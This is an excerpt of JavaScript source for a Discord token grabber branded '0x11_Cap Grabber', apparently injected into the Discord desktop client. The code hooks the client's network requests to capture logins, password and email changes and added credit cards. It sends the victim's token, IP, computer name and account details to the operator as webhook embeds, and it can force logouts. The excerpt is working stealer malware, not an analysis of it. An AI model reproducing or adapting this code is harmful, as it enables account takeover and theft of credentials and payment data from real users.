...
const makeEmbed = async ({
    ...
    var params = {
        username: "0x11_Cap Grabber",
        avatar_url: "https://i1.sndcdn.com/artworks-fkkYN4FiN3kM82by-Jgy2yw-t500x500.jpg",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: "©Py0x11 | https://github.com/Py0x11"
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/0x11_Cap")) fs.rmdirSync(__dirname + "/0x11_Cap")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "0x11_Cap Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/0x11_Cap-Assets/main/0x11_Cap%20(2).png"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/0x11_Cap-Assets/main/Banner.png"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[0x11_Cap 2023 <a:0x11_Capgif:1041634542093619260>](https://github.com/KSCHdsc/0x11_Cap-Grabber)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "0x11_Caped User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "0x11_Cap Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "0x11_Cap User Login",
                description: "[<a:0x11_Capgif:1041634542093619260>  **Oh you have 0x11_Caped someone**](https://github.com/KSCHdsc)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "0x11_Cap Detect Password Changed",
                    description: "[<a:0x11_Capgif:1041634542093619260>  **Oh you have 0x11_Caped someone**](https://github.com/KSCHdsc)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        ...
                        name: "Bio <a:0x11_Capgif:1041634542093619260>",
                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                        inline: !1
                    }, {
                        name: "<a:tokens:1041634540537511957> Token",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "0x11_Cap Detect Email Changed",
                    description: "[<a:0x11_Capgif:1041634542093619260>  **Oh you have 0x11_Caped someone**](https://github.com/KSCHdsc)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "0x11_Cap User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
